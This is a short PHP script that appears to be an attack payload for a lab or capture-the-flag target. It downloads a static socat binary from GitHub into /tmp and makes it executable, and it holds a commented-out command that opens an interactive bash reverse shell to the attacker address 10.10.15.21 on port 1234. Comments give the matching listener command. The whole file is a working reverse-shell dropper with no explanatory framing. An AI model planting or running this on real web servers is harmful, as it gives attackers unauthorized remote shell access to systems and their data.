<?php

$cmd = 'socat';
$ip='10.10.15.21';
$port='1234';

$out=null;

if (`which socat`) {
    echo "socat exists!";


} else {
    echo "socat does not exist!";

    exec("wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat", $output, $out);
    echo $out;

    exec("chmod +x /tmp/socat", $output, $out);
    echo $out;

    exec("ls -lash /tmp/socat", $output, $out);
    echo $out;
    
    exec("ls /tmp", $output, $out);
    echo $out;

    echo 'asdf :3';

    $cmd = '/tmp/socat';

}

// exec($cmd . " tcp:".$ip.":".$port." exec:'bash -i' ,pty,stderr,setsid,sigint,sane &");

// run this on attacker machine:    socat file:`tty`,raw,echo=0 tcp-listen:1234
// pretend to be victim:            socat tcp-connect:localhost:1234 exec:/bin/sh,pty,stderr,setsid,sigint,sane
